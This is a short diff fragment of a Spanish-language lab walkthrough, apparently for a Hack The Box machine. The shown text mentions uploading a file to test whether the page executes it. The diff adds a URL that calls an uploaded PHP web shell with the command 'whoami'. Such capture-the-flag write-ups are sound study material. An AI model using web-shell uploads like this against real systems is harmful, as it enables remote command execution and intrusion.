@@ -303,3 +303,5 @@ vamos a subir nuestro archivo para identificar si la pagina puede interpretarnos
 
 ![[Pasted image 20240724151934.png]]
 
+
+`http://internal.analysis.htb/dashboard/uploads/cmd.php?cmd=whoami`
